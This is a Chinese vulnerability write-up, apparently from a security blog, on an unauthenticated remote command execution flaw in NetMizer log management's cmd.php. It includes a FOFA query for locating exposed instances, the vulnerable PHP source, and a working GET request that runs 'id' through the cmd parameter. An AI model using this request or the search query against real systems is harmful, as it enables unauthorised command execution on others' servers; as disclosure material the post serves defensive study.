---
title: "NetMizer日志管理系统 cmd.php 远程命令执行漏洞"
source: https://mrxn.net/jswz/data-manage-cmd-rce.html
asset_dir: assets/netmizer日志管理系统-cmd.php-远程命令执行漏洞
---

# NetMizer日志管理系统 cmd.php 远程命令执行漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/2/21 18:40
- 802浏览
- [0评论](#comment)
- 11分钟阅读

深入探索

安全

SQL

应用程序

---

# 漏洞简介

NetMizer日志管理系统是全球领先的应用交付与安全解决方案提供商，致力于为企业和运营商提供确保关键业务应用高可用性、高性能和安全性的解决方案。在其cmd.php中存在远程命令执行[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)，攻击者通过传递 cmd 参数可执行任意命令，从而对系统造成潜在威胁。

编程

# 影响版本

# fofa语法

> title="NetMizer 日志管理系统"

# 漏洞分析

```
<?php
        include('../include/JSON.php');

        $ip = $_SERVER["REMOTE_ADDR"];
        $port = $_SERVER["REMOTE_PORT"];

        echo "sh test.sh $ip $port<br>";
        ob_flush();
        flush();
        exec("sh test.sh $ip $port &> /dev/null &");
        if($type == 1) $cmd = "ping 8.8.8.8";
        else if($type == 2) $cmd = "vmstat -w 1";
        ob_implicit_flush();
        $fp = popen($cmd, "r");
        if($fp) {
                echo "<pre>";
                ob_flush();
                flush();
                while($line=fgets($fp, 2048)) {
                        echo $line;
                        ob_flush();
                        flush();

                }
                sleep(1);
                pclose($fp);
        }

?>
```

如果 type 不等于 1 或 2 就直接将 cmd 参数的值传入 popen 函数进行执行并回显命令执行结果，造成[命令执行](https://mrxn.net/tag/rce)漏洞。

# 漏洞复现

```
GET /data/manage/cmd.php?cmd=id HTTP/1.1
Host: test.mrxn.net
```

成功回显id命令执行的结果

漏洞扫描服务

[![NetMizer日志管理系统 cmd.php 远程命令执行漏洞](images/img-001-42272b881df5.webp)](https://image.mrxn.net/c4253b5d1f3f4d4c912c9c41ed8c707f.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
